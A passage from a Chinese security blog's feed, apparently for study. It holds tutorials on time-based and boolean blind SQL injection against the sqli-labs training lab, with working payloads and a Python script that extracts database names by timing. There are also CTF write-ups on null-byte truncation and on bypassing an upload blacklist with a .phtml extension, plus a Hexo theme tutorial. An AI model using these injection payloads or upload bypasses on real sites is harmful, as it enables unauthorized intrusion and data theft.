href="https://space.bilibili.com/454748309?from=search&seid=18325354498408147035">bohe-mian大佬</a></p><p>可以在目录里加东西</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808011223803-1596820355613.png" alt="image-20200808011223803"></p><p>加1.php 不过为了分隔，使用了%00</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808011341262.png" alt="image-20200808011341262"></p><p>然后需要decode转码</p><p>然后就得到了flag</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200808011413096.png" alt="image-20200808011413096"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.时间注入</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/6.%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/6.%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>我们在上一章节已经基本了解了盲注的概念和布尔盲注，时间注入与布尔盲注原理类似，也是盲注的一种。</p><a id="more"></a><hr><h1 id="什么是时间注入"><a href="#什么是时间注入" class="headerlink" title="什么是时间注入"></a>什么是时间注入</h1><p>时间注入、时间盲注、延时注入都是它，它使用在一种比布尔盲注还要极端的状态</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL&amp;~E_WARNING);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE od = &#x27;id&#x27; limit 0,1&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就如上面代码所诉，代码存在SQL注入漏洞，然而页面即不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面的内容来进行判断。</p><p>这时候我们就需要通过构造语句，来通过页面响应的时长来判断信息，这就是时间盲注</p><hr><h1 id="时间盲注的方法"><a href="#时间盲注的方法" class="headerlink" title="时间盲注的方法"></a>时间盲注的方法</h1><h2 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h2><p>构造逻辑语句，通过条件语句进行判断，为真则立即执行，否则延时执行</p><p>核心语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(left(user(),<span class="number">1</span>)=<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>,sleep(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><p>语句构造方式与布尔盲注基本类似，只是在外面加了一层if判断，判断为真返回第二个值，不成功返回第三个值<code>sleep(3)</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200806153210600.png" alt="image-20200806153210600"></p><p>真实场景常用语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span>,<span class="number">0</span>,sleep(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><h2 id="实际练习"><a href="#实际练习" class="headerlink" title="实际练习"></a>实际练习</h2><p>使用场景sqlibs-less10</p><p>我们打开源代码可以发现，第十关无论是否执行成功，返回结果都是  You are in………..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(left(user(),1)&#x3D;&#39;s&#39;,0,sleep(10))-- #</span><br></pre></td></tr></table></figure><p>我们这里猜测user()的第一个字符是s，能够明显的感觉到网页加载速度的变慢</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200806163542633.png" alt="image-20200806163542633"></p><p>而如果网页速度没有变慢，则说明，我们的判断值是对的，我们就可以通过这样的方式来一个一个拆解判断获取正确的值</p><p>为了匹配更多的场景，取消单引号的出现必不可少，为了提高效率也可以使用二分法来判断，所以我们使用得更多的就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-10&#x2F;?id&#x3D;1&quot; and if(ascii(substr(database(),1,1))&lt;105,0,sleep(10))-- +</span><br></pre></td></tr></table></figure><p>同样的，我们就可以判断当前库名首字母大于或等于105</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200807181307649.png" alt="image-20200807181307649"></p><p>为了方便检测，我们使用python3来写一个脚本</p><p>引入库requests(发送http请求)和time(获取时间)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/Less-10/?id=1&#x27;</span> <span class="comment">#存在时间盲注的地址</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">&#x27;select schema_name from information_schema.schemata&#x27;</span> <span class="comment">#查库名</span></span><br><span class="line">column = <span class="string">&#x27;select column_name from information_schema.columns where table_name=&quot;table_name&quot;&#x27;</span> <span class="comment">#查列名：不同的列只需要替换table_name表名(如果使用十六进制可以不加引号)</span></span><br><span class="line">table = <span class="string">&#x27;select table_name from information_schema.tables where table_schema=database()&#x27;</span> <span class="comment">#查表名:不同库的表只需要修改database()(如果使用十六进制可以不加引号)</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): <span class="comment"># 字符串长度截取</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">122</span>): <span class="comment"># ascii码值</span></span><br><span class="line">        payload = <span class="string">&#x27;&quot; and if(ascii(substr((&#123;&#125; limit 0,1),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&#x27;</span>.format(database,i,j)</span><br><span class="line">            <span class="comment"># 因为测试场景会有大量的失败，所以这里选择成功延时，失败不延时</span></span><br><span class="line">            <span class="comment"># 测试第二个库只需要修改limit 1,1 依次类推</span></span><br><span class="line">        stime = time.time() <span class="comment">#开始时间</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        etime = time.time() <span class="comment">#结束时间</span></span><br><span class="line">        <span class="keyword">if</span> etime-stime &gt;= <span class="number">3</span>: <span class="comment"># 要排除网络环境的影响</span></span><br><span class="line">            result += chr(j) <span class="comment"># j是结果，转换回字母</span></span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行结果</p><p>这里就不进行更多的演示了</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200807185134533.png" alt="image-20200807185134533"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.合天网安第六题-套娃一样的上传</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/6.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%85%AD%E9%A2%98-%E5%A5%97%E5%A8%83%E4%B8%80%E6%A0%B7%E7%9A%84%E4%B8%8A%E4%BC%A0%20/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/CTF%E8%A7%A3%E9%A2%98/6.%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89%E7%AC%AC%E5%85%AD%E9%A2%98-%E5%A5%97%E5%A8%83%E4%B8%80%E6%A0%B7%E7%9A%84%E4%B8%8A%E4%BC%A0%20/</url>
      
        <content type="html"><![CDATA[<h1 id="题目概况"><a href="#题目概况" class="headerlink" title="题目概况"></a>题目概况</h1><p>题目：合天网安第六题-套娃一样的上传 </p><p>题目网址:<a href="https://www.hetianlab.com/expc.do?ce=87d2ebc9-e1bc-4649-b302-ad03d0838728">https://www.hetianlab.com/expc.do?ce=87d2ebc9-e1bc-4649-b302-ad03d0838728</a></p><a id="more"></a><h2 id="实验指导书"><a href="#实验指导书" class="headerlink" title="实验指导书"></a>实验指导书</h2><p>目标机：Centos7 IP地址：10.1.1.147:5006</p><p>攻击机：Win 10   IP地址：随机分配</p><p>要求：获取目标flag</p><p>提示：flag格式为flag{}</p><hr><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>第一步，打开网页可以发现还是一个上传，查看源代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200803145534358.png" alt="image-20200803145527153"></p><p>我们首先发现要传个脚本文件，然后还只能是jpg.png.bmp.gif格式的</p><p>老规矩，随便上传一张图片，然后打开burp抓包丢入测试器</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200803145736106.png" alt="image-20200803145736106"></p><p>已知要脚本文件，那么我们把上传后缀改为php</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200803145854931.png" alt="image-20200803145854931"></p><p>初步上传了一下， 意外的绕过了第一和第二层防护，第三层防护告诉我们上传有黑名单</p><p>PHP有很多种后缀，phtml、pht、php3、php4和php5都是Apache和php认可的php程序的文件后缀，用到phtml和phps的时候发现能过</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200803150910685.png" alt="image-20200803150910685"></p><p>然后就是告诉我们和长度相关，这时候就需要测试一下是文件名长度还是文件长度，或者其他什么长度</p><p>测试得知是文件长度</p><p>创建了一个文件a.png，文本打开输入<code>12345678901234567</code>十七个数字</p><p>上传再次抓包重发，在包中修改文件名为a.phtml，得到flag</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200803151421660.png" alt="image-20200803151421660"></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> CTF解题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1.hexo+next友情链接页面搭建</title>
      <link href="%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/1.hexo+next%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E9%A1%B5%E9%9D%A2%E6%90%AD%E5%BB%BA/"/>
      <url>%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/hexo%E7%9B%B8%E5%85%B3/%E8%BF%90%E7%BB%B4%E7%9B%B8%E5%85%B3/hexo/1.hexo+next%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E9%A1%B5%E9%9D%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>安装next模板的初始设置，友情链接是直接放在侧边栏里的，少还好，一旦友情链接多了，就会显得侧边栏特别的杂乱，所以就打算专门做个页面来存放友链</p><a id="more"></a><hr><h1 id="新增Links页面"><a href="#新增Links页面" class="headerlink" title="新增Links页面"></a>新增Links页面</h1><p>命令创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page links</span><br></pre></td></tr></table></figure><p>然后根目录下/source就新增了一个links文件夹，里面还有一个index.md文件</p><p>在文件中写入<code>type: &quot;links&quot;</code>，如果还想禁止评论的话就再写一个<code>comments: false</code></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802221518001.png" alt="image-20200802221518001"></p><h1 id="创建友链栏"><a href="#创建友链栏" class="headerlink" title="创建友链栏"></a>创建友链栏</h1><p>在<code>blog\themes\next\_config.yml</code>里找到menu，在其中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">links: &#x2F;links&#x2F;|| link</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802222719980.png" alt="image-20200802222719980"></p><p>在<code>blog\themes\next\languages\zh-Hans.yml</code>的menu里添加中文描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">links: 友链</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802222637653.png" alt="image-20200802222637653"></p><h1 id="增加友链页面样式"><a href="#增加友链页面样式" class="headerlink" title="增加友链页面样式"></a>增加友链页面样式</h1><p>在<code>blog\themes\next\layout</code>创建links.swig，内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line">  &#123;### LINKS BLOCK ###&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line"></span><br><span class="line">    &lt;div id&#x3D;&quot;links&quot;&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line"></span><br><span class="line">            #links&#123;</span><br><span class="line">               margin-top: 5rem;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .links-content&#123;</span><br><span class="line">                margin-top:1rem;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .link-navigation::after &#123;</span><br><span class="line">                content: &quot; &quot;;</span><br><span class="line">                display: block;</span><br><span class="line">                clear: both;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .card &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                font-size: 1rem;</span><br><span class="line">                padding: 10px 20px;</span><br><span class="line">                border-radius: 4px;</span><br><span class="line">                transition-duration: 0.15s;</span><br><span class="line">                margin-bottom: 1rem;</span><br><span class="line">                display:flex;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:nth-child(odd) &#123;</span><br><span class="line">                float: left;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:nth-child(even) &#123;</span><br><span class="line">                float: right;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:hover &#123;</span><br><span class="line">                transform: scale(1.1);</span><br><span class="line">                box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04);</span><br><span class="line">            &#125;</span><br><span class="line">            .card a &#123;</span><br><span class="line">                border:none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .ava &#123;</span><br><span class="line">                width: 3rem!important;</span><br><span class="line">                height: 3rem!important;</span><br><span class="line">                margin:0!important;</span><br><span class="line">                margin-right: 1em!important;</span><br><span class="line">                border-radius:4px;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header &#123;</span><br><span class="line">                font-style: italic;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                width: 236px;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a &#123;</span><br><span class="line">                font-style: normal;</span><br><span class="line">                color: #2bbc8a;</span><br><span class="line">                font-weight: bold;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a:hover &#123;</span><br><span class="line">                color: #d480aa;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header .info &#123;</span><br><span class="line">                font-style:normal;</span><br><span class="line">                color:#a3a3a3;</span><br><span class="line">                font-size:14px;</span><br><span class="line">                min-width: 0;</span><br><span class="line">                text-overflow: ellipsis;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                white-space: nowrap;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;style&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;links-content&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;link-navigation&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &#123;% for link in theme.mylinks %&#125;</span><br><span class="line"></span><br><span class="line">                    &lt;div class&#x3D;&quot;card&quot;&gt;</span><br><span class="line">                        &lt;img class&#x3D;&quot;ava&quot; src&#x3D;&quot;&#123;&#123; link.avatar &#125;&#125;&quot;&#x2F;&gt;</span><br><span class="line">                        &lt;div class&#x3D;&quot;card-header&quot;&gt;</span><br><span class="line">                           &lt;div&gt;</span><br><span class="line">                              &lt;a href&#x3D;&quot;&#123;&#123; link.site &#125;&#125;&quot; target&#x3D;&quot;_blank&quot;&gt; &#123;&#123; link.nickname &#125;&#125;&lt;&#x2F;a&gt;</span><br><span class="line">                              &lt;a href&#x3D;&quot;&#123;&#123; link.site &#125;&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;span class&#x3D;&quot;focus-links&quot;&gt;关注&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;</span><br><span class="line">                           &lt;&#x2F;div&gt;</span><br><span class="line">                           &lt;div class&#x3D;&quot;info&quot;&gt;&#123;&#123; link.info &#125;&#125;&lt;&#x2F;div&gt;</span><br><span class="line">                        &lt;&#x2F;div&gt;</span><br><span class="line">                    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &#123;&#123; page.content &#125;&#125;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">  &#123;### END LINKS BLOCK ###&#125;</span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>修改<code>blog\themes\next\layout\page.swig</code>页面</p><p>在block title内部插入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 友情链接--&gt;</span><br><span class="line">#&#125;&#123;% elif page.type &#x3D;&#x3D;&#x3D; &#39;links&#39; and not page.title %&#125;&#123;#</span><br><span class="line">  #&#125;&#123;&#123; __(&#39;title.links&#39;) + page_title_suffix &#125;&#125;&#123;#</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802223147086.png" alt="image-20200802223147086"></p><p>在同页面的PAGE BODY内部引入page.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 友情链接--&gt;</span><br><span class="line">&#123;% elif page.type &#x3D;&#x3D;&#x3D; &#39;links&#39; %&#125;</span><br><span class="line">    &#123;% include &#39;links.swig&#39; %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802223308895.png" alt="image-20200802223308895"></p><h1 id="配置友链"><a href="#配置友链" class="headerlink" title="配置友链"></a>配置友链</h1><p>在<code>blog\themes\next\_config.yml</code>里的末尾处新增mylinks，这里就是做友情链接的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mylinks:</span><br><span class="line"></span><br><span class="line">- nickname: 尘埃&#39;s blog</span><br><span class="line">  avatar: https:&#x2F;&#x2F;dustca.xyz&#x2F;image&#x2F;avatar.jpeg</span><br><span class="line">  site: https:&#x2F;&#x2F;Mint-Bh.github.io</span><br><span class="line">  info: 一个搞安全的咸鱼</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200802223531176.png" alt="image-20200802223531176"></p>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
          <category> hexo相关 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.布尔盲注</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/5.%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/5.%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>注入我们已经有了简单的概念，然而，就是在sql注入过程中，某些sql语句的执行结果被程序限制不回显到前端，这时候我们只能用一些别的方法进行判断或者尝试，这个判断或尝试过程就叫盲注。</p><a id="more"></a><hr><h1 id="什么是布尔盲注"><a href="#什么是布尔盲注" class="headerlink" title="什么是布尔盲注"></a>什么是布尔盲注</h1><p>布尔是判断真假，那么布尔盲注就是通过判断真假的方式来判断或尝试的注入攻击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL&amp;~E_WARNING);<span class="comment">//设置错误等级至WARNING不报错</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);<span class="comment">//引入sqlilabs配置文件连接数据库</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Right&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来看一个简单的例子，这代码简单来说就是如果执行成功打印Right，失败了打印Wrong。他不会再去打印过多的错误信息，这个时候我们就需要通过构造语句，来判断数据库信息的正确性，再通过页面返回的真假来识别我们判断的是否正确</p><hr><h1 id="布尔盲注的方法"><a href="#布尔盲注的方法" class="headerlink" title="布尔盲注的方法"></a>布尔盲注的方法</h1><p>构造逻辑判断语句，判断信息真假，取出所有的真值，实现SQL注入</p><h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>首先判断注入点，盲注是没有直接的回显的，我们需要判断页面是否能够正常显示来确定注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure><p>页面正常显示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729111014915.png" alt="image-20200729111014915"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and &#39;1&#39; &#x3D;&#39;2</span><br></pre></td></tr></table></figure><p>页面不显示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729111045570.png" alt="image-20200729111045570"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and &#39;1&#39; &#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>页面再次正常显示</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200729111014915.png" alt="image-20200729111014915"></p><p>说明这里就是注入点</p><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="left0函数"><a href="#left0函数" class="headerlink" title="left0函数"></a>left0函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 